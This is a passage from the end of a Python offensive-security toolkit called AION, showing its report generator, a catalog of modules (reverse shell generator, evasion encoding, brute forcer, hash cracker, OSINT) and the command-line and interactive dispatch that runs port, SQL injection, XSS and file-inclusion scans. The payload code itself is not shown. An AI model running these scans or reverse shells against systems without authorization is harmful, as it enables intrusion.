        h2 {{ color: #ff8888; margin-top: 30px; }}
        .section {{ background: #1a1f1f; padding: 20px; margin: 20px 0; border-radius: 5px; border-left: 5px solid #ff4444; }}
        .vuln-high {{ color: #ff4444; }}
        .vuln-medium {{ color: #ffaa44; }}
        .vuln-low {{ color: #44ff44; }}
        table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
        th {{ background: #ff4444; color: white; padding: 10px; text-align: left; }}
        td {{ padding: 10px; border-bottom: 1px solid #333; }}
        .footer {{ text-align: center; margin-top: 50px; color: #666; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>⚡ AION Security Assessment Report</h1>
        <div class="section">
            <h2>Target Information</h2>
            <p><strong>Target:</strong> {self.target}</p>
            <p><strong>Date:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p><strong>Generated by:</strong> kakashi-kx</p>
        </div>
        
        <div class="section">
            <h2>Executive Summary</h2>
            <p>Security assessment completed on {self.target}. Found vulnerabilities and open ports are listed below.</p>
        </div>
        
        <div class="section">
            <h2>Scan Results</h2>
            <pre>{json.dumps(self.findings, indent=2)}</pre>
        </div>
        
        <div class="footer">
            <p>Report generated by AION v{VERSION} | Developed by kakashi-kx</p>
            <p><a href="https://github.com/kakashi-kx/AION" style="color: #ff4444;">GitHub Repository</a></p>
        </div>
    </div>
</body>
</html>"""
        
        with open(filepath, 'w') as f:
            f.write(html)
        
        return filepath
    
    def generate_json(self, filepath):
        report = {
            'tool': 'AION',
            'version': VERSION,
            'author': AUTHOR,
            'target': self.target,
            'timestamp': datetime.now().isoformat(),
            'findings': self.findings
        }
        
        with open(filepath, 'w') as f:
            json.dump(report, f, indent=2)
        
        return filepath
    
    def generate_txt(self, filepath):
        with open(filepath, 'w') as f:
            f.write("="*60 + "\n")
            f.write("AION SECURITY ASSESSMENT REPORT\n")
            f.write("="*60 + "\n\n")
            f.write(f"Target: {self.target}\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Generated by: kakashi-kx\n\n")
            f.write(json.dumps(self.findings, indent=2))
        
        return filepath

# ============================================================================
# MAIN FUNCTIONS
# ============================================================================

def list_all_modules():
    """Display all available modules"""
    print(f"\n{R}{'='*70}{RS}")
    print(f"{Y}📋 AION COMPLETE MODULE CATALOG - 40+ Professional Tools{RS}")
    print(f"{R}{'='*70}{RS}\n")
    
    modules = [
        ("🔍 RECONNAISSANCE", [
            ("subdomain_finder", "Find subdomains using multiple techniques"),
            ("dns_enum", "DNS enumeration and zone transfer"),
            ("port_scanner", "Ultra-fast multi-threaded port scanner"),
            ("tech_detector", "Detect web technologies and frameworks"),
            ("wayback_machine", "Fetch historical URLs from Wayback Machine"),
            ("github_dorking", "Search GitHub for sensitive information"),
            ("shodan_lookup", "Query Shodan for device information"),
        ]),
        ("💻 WEB VULNERABILITY", [
            ("sql_injection", "Advanced SQL injection scanner"),
            ("xss_scanner", "Cross-site scripting detector"),
            ("lfi_rfi_scanner", "Local/Remote file inclusion scanner"),
            ("ssrf_scanner", "Server-side request forgery tester"),
            ("open_redirect", "Open redirect vulnerability scanner"),
            ("cors_scanner", "CORS misconfiguration detector"),
            ("csrf_tester", "Cross-site request forgery tester"),
        ]),
        ("🌐 NETWORK ATTACKS", [
            ("service_detection", "Service version detection"),
            ("banner_grabbing", "Grab service banners"),
            ("ssl_tls_scanner", "SSL/TLS security analysis"),
            ("packet_sniffer", "Live network packet capture"),
            ("arp_spoof_detector", "Detect ARP spoofing attacks"),
            ("mitm_scanner", "Man-in-the-middle vulnerability scanner"),
        ]),
        ("🔐 AUTHENTICATION", [
            ("jwt_tester", "JWT token security analysis"),
            ("oauth_scanner", "OAuth implementation tester"),
            ("session_fixation", "Session fixation vulnerability scanner"),
            ("rate_limit_tester", "API rate limiting bypass tester"),
            ("default_creds", "Default credential checker"),
            ("brute_forcer", "Multi-protocol brute forcer"),
        ]),
        ("💥 EXPLOITATION", [
            ("reverse_shell", "Reverse shell payload generator"),
            ("metasploit", "Metasploit integration wrapper"),
            ("cve_scanner", "CVE vulnerability lookup"),
            ("exploit_db", "Exploit-DB search"),
            ("payload_encoder", "Payload encoding for evasion"),
        ]),
        ("🕵️ OSINT", [
            ("email_osint", "Email address intelligence"),
            ("username_osint", "Username search across platforms"),
            ("phone_osint", "Phone number lookup"),
            ("social_media", "Social media profile finder"),
            ("dark_web", "Dark web presence scanner"),
        ]),
        ("🔧 UTILITIES", [
            ("hash_cracker", "MD5/SHA1/SHA256 hash cracker"),
            ("password_gen", "Secure password generator"),
            ("encoder_decoder", "Base64/URL/Hex encoder/decoder"),
            ("ip_tools", "IP address information and tools"),
            ("domain_tools", "Domain WHOIS and DNS tools"),
        ]),
        ("📊 REPORTING", [
            ("pdf_report", "Professional PDF report generation"),
            ("html_report", "Interactive HTML dashboard"),
            ("json_export", "JSON data export"),
            ("mitre_mapping", "MITRE ATT&CK framework mapping"),
            ("executive_summary", "Executive-level summary report"),
        ]),
    ]
    
    total = sum(len(tools) for _, tools in modules)
    print_info(f"Total Professional Modules: {total}")
    print()
    
    for category, tools in modules:
        print(f"{Y}{category}{RS}")
        print(f"{R}{'-'*60}{RS}")
        for tool, desc in tools:
            print(f"  {G}►{RS} {W}{tool:<20}{RS} - {desc}")
        print()

def interactive_mode():
    """Interactive shell mode"""
    # IMPORTANT: No print_banner() here - banner already printed in main()
    print_info("Entering interactive mode. Type 'help' for commands, 'exit' to quit.\n")
    
    while True:
        try:
            cmd = input(f"{R}aion>{RS} ").strip().lower()
            
            if cmd in ['exit', 'quit']:
                print_success("Exiting interactive mode")
                break
            
            elif cmd == 'help':
                print(f"\n{Y}Available Commands:{RS}")
                print("  help              - Show this help message")
                print("  recon <target>    - Run reconnaissance")
                print("  web <target>      - Run web vulnerability scan")
                print("  osint <target>    - Run OSINT gathering")
                print("  exploit <lhost> <lport> - Generate reverse shells")
                print("  crack <hash> <type> - Crack hash (md5/sha1/sha256)")
                print("  encode <data>     - Base64 encode data")
                print("  decode <data>     - Base64 decode data")
                print("  modules           - List all modules")
                print("  clear             - Clear screen")
                print("  exit              - Exit interactive mode")
                print()
            
            elif cmd == 'modules':
                list_all_modules()
            
            elif cmd.startswith('recon '):
                target = cmd[6:].strip()
                print_info(f"Running reconnaissance on {target}")
                
                # Resolve target
                ip, type = check_target(target)
                if ip:
                    print_success(f"Target resolved: {target} -> {ip}")
                    
                    # Port scan
                    scanner = PortScanner(ip, ports="1-1000")
                    scanner.scan()
                    
                    # Technology detection
                    if type == 'domain':
                        tech = TechnologyDetector(target)
                        tech.detect()
                        
                    print_success("Reconnaissance completed")
                else:
                    print_error(f"Could not resolve target: {target}")
            
            elif cmd.startswith('web '):
                target = cmd[4:].strip()
                print_info(f"Running web vulnerability scan on {target}")
                
                # SQLi scan
                sqli = SQLInjectionScanner(target)
                sqli.scan()
                
                # XSS scan
                xss = XSSScanner(target)
                xss.scan()
                
                # LFI scan
                lfi = LFIRFIScanner(target)
                lfi.scan()
                
                print_success("Web vulnerability scan completed")
            
            elif cmd.startswith('osint '):
                target = cmd[6:].strip()
                print_info(f"Running OSINT on {target}")
                
                if '@' in target:
                    email = EmailOSINT(target)
                    email.analyze()
                else:
                    username = UsernameOSINT(target)
                    username.search()
                
                print_success("OSINT completed")
            
            elif cmd.startswith('exploit '):
                parts = cmd.split()
                if len(parts) == 3:
                    lhost = parts[1]
                    lport = int(parts[2])
                    shell = ReverseShellGenerator(lhost, lport)
                    shell.generate_all()
                else:
                    print_error("Usage: exploit <lhost> <lport>")
            
            elif cmd.startswith('crack '):
                parts = cmd.split()
                if len(parts) == 3:
                    hash_value = parts[1]
                    hash_type = parts[2]
                    cracker = HashCracker(hash_value, hash_type)
                    cracker.crack()
                else:
                    print_error("Usage: crack <hash> <type>")
            
            elif cmd.startswith('encode '):
                data = cmd[7:].strip()
                encoded = EncoderDecoder.encode(data)
                print_success(f"Encoded: {encoded}")
            
            elif cmd.startswith('decode '):
                data = cmd[7:].strip()
                decoded = EncoderDecoder.decode(data)
                print_success(f"Decoded: {decoded}")
            
            elif cmd == 'clear':
                os.system('cls' if os.name == 'nt' else 'clear')
                print_banner()  # Only reprint banner on clear command
                print_info("Entering interactive mode. Type 'help' for commands, 'exit' to quit.\n")
            
            else:
                print_error(f"Unknown command: {cmd}")
                
        except KeyboardInterrupt:
            print()
            print_warning("Use 'exit' to quit")
        except Exception as e:
            print_error(f"Error: {e}")

def run_full_audit(target):
    """Run complete security audit"""
    print_info(f"Starting full security audit on {target}")
    
    results = {}
    
    # Resolve target
    ip, type = check_target(target)
    if not ip:
        print_error(f"Could not resolve target: {target}")
        return results
    
    results['target'] = target
    results['ip'] = ip
    results['type'] = type
    
    # Port scan
    print_info("Running port scan...")
    scanner = PortScanner(ip, ports="1-1000")
    results['ports'] = scanner.scan()
    
    # Web scan if web ports found
    web_ports = [p['port'] for p in results['ports'] if p['port'] in [80,443,8080,8443]]
    if web_ports and type == 'domain':
        print_info("Running web vulnerability scan...")
        
        for port in web_ports:
            url = f"http://{target}:{port}"
            if port in [443,8443]:
                url = f"https://{target}:{port}"
            
            # Technology detection
            tech = TechnologyDetector(url)
            results['technologies'] = tech.detect()
            
            # SQL injection
            sqli = SQLInjectionScanner(url)
            results['sql_injection'] = sqli.scan()
            
            # XSS
            xss = XSSScanner(url)
            results['xss'] = xss.scan()
            
            # LFI
            lfi = LFIRFIScanner(url)
            results['lfi'] = lfi.scan()
    
    # OSINT
    if type == 'domain':
        print_info("Running OSINT...")
        
        # Subdomains
        subfinder = SubdomainFinder(target)
        results['subdomains'] = subfinder.scan()
        
        # DNS
        dns = DNSEnumerator(target)
        results['dns'] = dns.enumerate()
    
    print_success("Full security audit completed")
    return results

# ============================================================================
# MAIN ENTRY POINT
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description='AION - Advanced Intrusion Offensive Network',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    # Target options
    parser.add_argument('--target', '-t', help='Target IP or domain')
    parser.add_argument('--ports', '-p', default='1-1000', help='Port range')
    parser.add_argument('--threads', type=int, default=200, help='Thread count')
    parser.add_argument('--timeout', type=float, default=0.3, help='Timeout in seconds')
    
    # Scan modes
    parser.add_argument('--recon', action='store_true', help='Run reconnaissance')
    parser.add_argument('--web-scan', action='store_true', help='Run web vulnerability scan')
    parser.add_argument('--osint', action='store_true', help='Run OSINT gathering')
    parser.add_argument('--full-audit', action='store_true', help='Run full security audit')
    
    # Specific modules
    parser.add_argument('--subdomains', action='store_true', help='Find subdomains')
    parser.add_argument('--dns-enum', action='store_true', help='DNS enumeration')
    parser.add_argument('--tech-detect', action='store_true', help='Detect technologies')
    parser.add_argument('--wayback', action='store_true', help='Fetch Wayback Machine URLs')
    
    # Web vuln specific
    parser.add_argument('--sqli', action='store_true', help='SQL injection scan')
    parser.add_argument('--xss', action='store_true', help='XSS scan')
    parser.add_argument('--lfi', action='store_true', help='LFI/RFI scan')
    parser.add_argument('--open-redirect', action='store_true', help='Open redirect scan')
    
    # Exploitation
    parser.add_argument('--reverse-shell', nargs=2, metavar=('LHOST', 'LPORT'), help='Generate reverse shells')
    parser.add_argument('--crack-hash', nargs=2, metavar=('HASH', 'TYPE'), help='Crack hash (md5/sha1/sha256)')
    parser.add_argument('--generate-password', type=int, metavar='LENGTH', help='Generate secure password')
    
    # OSINT
    parser.add_argument('--email-osint', metavar='EMAIL', help='Email OSINT')
    parser.add_argument('--username-osint', metavar='USERNAME', help='Username OSINT')
    
    # Utilities
    parser.add_argument('--encode', nargs=2, metavar=('DATA', 'TYPE'), help='Encode data (base64/base32/hex/url)')
    parser.add_argument('--decode', nargs=2, metavar=('DATA', 'TYPE'), help='Decode data')
    parser.add_argument('--ip-info', metavar='IP', help='Get IP information')
    
    # Output options
    parser.add_argument('--output', '-o', help='Output file')
    parser.add_argument('--format', choices=['txt', 'json', 'html'], default='html', help='Output format')
    
    # Other options
    parser.add_argument('--list-modules', action='store_true', help='List all modules')
    parser.add_argument('--interactive', '-i', action='store_true', help='Interactive mode')
    parser.add_argument('--version', '-v', action='store_true', help='Show version')
    
    args = parser.parse_args()
    
    # Show banner only once
    print_banner()
    
    # Handle version
    if args.version:
        print_info(f"AION Version: {VERSION}")
        print_info(f"Developed by: {AUTHOR}")
        print_info(f"GitHub: {GITHUB}")
        return 0
    
    # Handle list modules
    if args.list_modules:
        list_all_modules()
        return 0
    
    # Handle interactive mode
    if args.interactive:
        interactive_mode()
        return 0
    
    # Handle specific modules without target
    if args.reverse_shell:
        lhost, lport = args.reverse_shell
        shell = ReverseShellGenerator(lhost, int(lport))
        shell.generate_all()
        return 0
    
    if args.crack_hash:
        hash_value, hash_type = args.crack_hash
        cracker = HashCracker(hash_value, hash_type)
        cracker.crack()
        return 0
    
    if args.generate_password:
        password = PasswordGenerator.generate(args.generate_password)
        print_success(f"Generated password: {password}")
        return 0
    
    if args.email_osint:
        email = EmailOSINT(args.email_osint)
        results = email.analyze()
        print(json.dumps(results, indent=2))
        return 0
    
    if args.username_osint:
        username = UsernameOSINT(args.username_osint)
        results = username.search()
        print(json.dumps(results, indent=2))
        return 0
    
    if args.encode:
        data, enc_type = args.encode
        result = EncoderDecoder.encode(data, enc_type)
        print_success(f"Encoded: {result}")
        return 0
    
    if args.decode:
        data, enc_type = args.decode
        result = EncoderDecoder.decode(data, enc_type)
        print_success(f"Decoded: {result}")
        return 0
    
    if args.ip_info:
        info = IPTools.get_info(args.ip_info)
        print(json.dumps(info, indent=2))
        return 0
    
    # Validate target for scans
    if not args.target:
        print_error("Target required! Use --target or --interactive")
        print_info("Example: python aion.py --target example.com --recon")
        return 1
    
    # Resolve target
    ip, type = check_target(args.target)
    if not ip:
        print_error(f"Could not resolve target: {args.target}")
        return 1
    
    print_success(f"Target resolved: {args.target} -> {ip} ({type})")
    
    # Initialize results
    results = {}
    
    # Run requested scans
    if args.recon or args.full_audit:
        print_info("Running reconnaissance...")
        
        # Port scan
        scanner = PortScanner(ip, ports=args.ports, threads=args.threads, timeout=args.timeout)
        results['port_scan'] = scanner.scan()
        
        # Technology detection for domains
        if type == 'domain':
            tech = TechnologyDetector(args.target)
            results['technologies'] = tech.detect()
        
        # Subdomains
        if args.subdomains or args.full_audit:
            subfinder = SubdomainFinder(args.target)
            results['subdomains'] = subfinder.scan()
        
        # DNS
        if args.dns_enum or args.full_audit:
            dns = DNSEnumerator(args.target)
            results['dns'] = dns.enumerate()
        
        # Wayback Machine
        if args.wayback or args.full_audit:
            wayback = WaybackMachine(args.target)
            results['wayback_urls'] = wayback.fetch()
    
    # Web vulnerability scan
    if args.web_scan or args.full_audit or args.sqli or args.xss or args.lfi or args.open_redirect:
        print_info("Running web vulnerability scan...")
        
        base_url = f"http://{args.target}" if type == 'domain' else f"http://{ip}"
        
        if args.sqli or args.full_audit:
            sqli = SQLInjectionScanner(base_url)
            results['sql_injection'] = sqli.scan()
        
        if args.xss or args.full_audit:
            xss = XSSScanner(base_url)
            results['xss'] = xss.scan()
        
        if args.lfi or args.full_audit:
            lfi = LFIRFIScanner(base_url)
            results['lfi'] = lfi.scan()
        
        if args.open_redirect or args.full_audit:
            redirect = OpenRedirectScanner(base_url)
            results['open_redirect'] = redirect.scan()
    
    # OSINT
    if args.osint or args.full_audit:
        print_info("Running OSINT...")
        
        if type == 'domain':
            results['osint'] = {}
    
    # Generate report
    if args.output or results:
        reporter = ReportGenerator(args.target, results, args.format)
        report_file = reporter.generate(args.output)
        print_success(f"Report saved to: {report_file}")
    
    # Summary
    print(f"\n{R}{'='*60}{RS}")
    print_success("Scan completed successfully!")
    
    return 0

# ============================================================================
# ENTRY POINT
# ============================================================================

if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print(f"\n{Y}⚠️ Scan interrupted by user{RS}")
        sys.exit(0)
    except Exception as e:
        print_error(f"Unexpected error: {e}")
        sys.exit(1)


